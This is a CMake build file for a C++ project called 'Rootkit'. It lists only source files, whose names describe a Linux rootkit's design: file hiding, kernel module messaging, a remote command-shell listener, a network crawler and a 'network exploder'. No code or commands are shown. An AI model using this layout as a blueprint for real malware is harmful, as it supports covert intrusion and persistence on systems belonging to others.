cmake_minimum_required(VERSION 3.26)
project(Rootkit)

set(CMAKE_CXX_STANDARD 20)

set(CMAKE_CXX_FLAGS "${CMAKE_CXX_FLAGS} -pthread")
add_executable(Rootkit
#        main.c

        basic/basic_rootkit.h
        basic/basic_plugin.h
        basic/basic_rootkit.cpp
        basic/mex_generator.h
        basic/mex_generator.cpp


#        linux file system access
        linux/file_system_access/file_system_access.h
        linux/file_system_access/file_system_access.cpp

#        linux network access
        linux/network_access/network_access.cpp
        linux/network_access/network_access.h
        linux/network_access/basic_client_handler.h
        linux/network_access/linux_client_handler.cpp
        linux/network_access/linux_client_handler.h

        linux/network_access/tcp/basic_tcp_port_listener.h
        linux/network_access/tcp/linux_tcp_port_connection_establisher.h
        linux/network_access/tcp/dummy_tcp_port_listener.cpp
        linux/network_access/tcp/dummy_tcp_port_listener.h
        linux/network_access/tcp/tcp_port.h

        # linux process access
        linux/process_access/process_access.h
        linux/process_access/process_access.cpp

        # linux cli shell access
        linux/cli_shell_access/cli_shell_access.cpp
        linux/cli_shell_access/cli_shell_access.h

#       linux features
        linux/features/network_crawler/network_crawler.cpp
        linux/features/network_crawler/network_crawler.h

        linux/features/network_exploder/network_exploder.cpp
        linux/features/network_exploder/network_exploder.h

        linux/file_hiding_access/file_hiding_access.cpp
        linux/file_hiding_access/file_hiding_access.h
        linux/kernel_access/kernel_access.cpp
        linux/kernel_access/kernel_access.h
        linux/kernel_access/operations_protocol.h
        linux/kernel_access/msg_to_module.h
        linux/kernel_access/msg_to_user.h

        linux/features/remote_cli_shell_controller/remote_cli_shell_controller.cpp
        linux/features/remote_cli_shell_controller/remote_cli_shell_controller.h
        linux/features/remote_cli_shell_controller/shell_command_tcp_port_listener.cpp
        linux/features/remote_cli_shell_controller/shell_command_tcp_port_listener.h

#       linux rootkit
        linux/linux_rootkit.cpp
        linux/linux_rootkit.h

#       linux rootkit controllers
        linux/test_rootkit_controller.cpp # contains main function
        linux/test_rootkit_controller.h

)
